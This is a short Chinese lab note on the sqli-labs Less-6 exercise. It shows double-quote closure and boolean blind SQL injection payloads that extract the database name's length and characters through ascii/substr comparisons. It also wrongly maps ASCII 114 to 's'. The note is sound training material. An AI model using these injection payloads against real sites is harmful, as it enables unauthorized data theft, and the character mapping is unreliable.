# Less-6 关于"闭合 报错注入/布尔盲注/时间盲注

**?id=1 正常**
**?id=1" 报错**
![](assets/Less6/file-20260530145118656.png)
**?id=1" --+** **正常**
![](assets/Less6/file-20260530145250875.png)

**关于"闭合**

这里利用**布尔盲注**：
**也就是错误和正确页面有区别**
- 判断数据库长度
```sql
?id=1" and length(database())
```
?id=1" and length(database())<=9 --+  #正常回显，数据库长度为8


- 判断数据库名中字母

select substr(database(),1,1);

- 截取数据库库名，从第1个字开始截取，每次截取1个

select ascii(substr(database(),1,1));

- 截取出来的字，使用ascii码编码

select ascii(substr(database(),1,1)) < 100;

所以

?id=1" and ascii(substr(database(),1,1))>114 --+

?id=1" and (select ascii(substr(database(),1,1))) >114 --+也行

![](assets/Less6/file-20260530150534319.png)
 所以库名第一个字母的ascii编码为114  ——s
 ---
 用脚本跑
